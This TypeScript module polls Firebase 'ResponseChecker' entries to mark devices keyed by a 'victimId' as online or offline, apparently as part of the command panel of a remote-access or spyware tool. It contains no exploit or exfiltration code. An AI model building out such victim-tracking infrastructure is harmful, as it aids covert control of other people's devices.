import { firebaseService } from './firebaseService';

export type RCResult = 'online' | 'offline' | 'pending' | 'unknown';

interface CheckOptions {
  delayMs?: number;
  retryMs?: number;
  maxRetries?: number;
  logPrefix?: string;
}

interface CheckArgs {
  modelIdentifier: string;
  victimId: string;
  additionalKeys?: string[];
  updateIds?: string[]; // DeviceInfo keys to update status under
}

// Normalize a ResponseChecker value into a status token
const normalize = (resp?: string | null): RCResult => {
  const r = String(resp || '').toLowerCase();
  if (r === 'idle' || r === 'true') return 'online';
  if (r === 'pending') return 'pending';
  if (!r) return 'unknown';
  return 'offline';
};

export async function setPendingAndVerify(
  args: CheckArgs,
  opts: CheckOptions = {}
): Promise<RCResult> {
  const { modelIdentifier, victimId } = args;
  const keys = Array.from(new Set([modelIdentifier, victimId, ...(args.additionalKeys || [])].filter(Boolean)));
  const updateIds = Array.from(new Set([victimId, ...((args.updateIds || []).filter(Boolean))]));

  const delayMs = opts.delayMs ?? 5000;
  const retryMs = opts.retryMs ?? 3000;
  const maxRetries = opts.maxRetries ?? 1;
  const logPrefix = opts.logPrefix ? `[${opts.logPrefix}]` : '[RC]';

  try {
    // Set pending under model -> mirror to victimId
    await firebaseService.setResponsePending(modelIdentifier, undefined, victimId);
    // Also mirror to any additional keys to maximize visibility
    for (const k of keys) {
      if (k !== modelIdentifier && k !== victimId) {
        try {
          await firebaseService.setResponsePending(k, undefined, victimId);
        } catch {}
      }
    }
  } catch (e) {
    console.warn(`${logPrefix} failed to set pending`, e);
  }

  const readAll = async (): Promise<RCResult> => {
    try {
      const results = await Promise.all(
        keys.map(async (k) => {
          const r = await firebaseService.getResponseChecker(k);
          return { key: k, resp: normalize(r?.response) };
        })
      );
      const anyOnline = results.find((r) => r.resp === 'online');
      const anyPending = results.find((r) => r.resp === 'pending' || r.resp === 'unknown');
      const chosen: RCResult = anyOnline ? 'online' : anyPending ? 'pending' : 'offline';
      console.debug(`${logPrefix} results`, { keys, results, chosen });
      return chosen;
    } catch (e) {
      console.warn(`${logPrefix} read error`, e);
      return 'unknown';
    }
  };

  const sleep = (ms: number) => new Promise((res) => setTimeout(res, ms));
  // First attempt after delay
  await sleep(delayMs);
  let status = await readAll();
  let attempts = 0;
  while ((status === 'pending' || status === 'unknown') && attempts < maxRetries) {
    await sleep(retryMs);
    status = await readAll();
    attempts += 1;
  }

  // Update DeviceInfo status under all updateIds for consistency
  try {
    for (const id of updateIds) {
      await firebaseService.updateDeviceStatus(id, status === 'online' ? 'Online' : 'Offline');
    }
  } catch (e) {
    console.warn(`${logPrefix} failed to update status`, e);
  }

  return status;
}
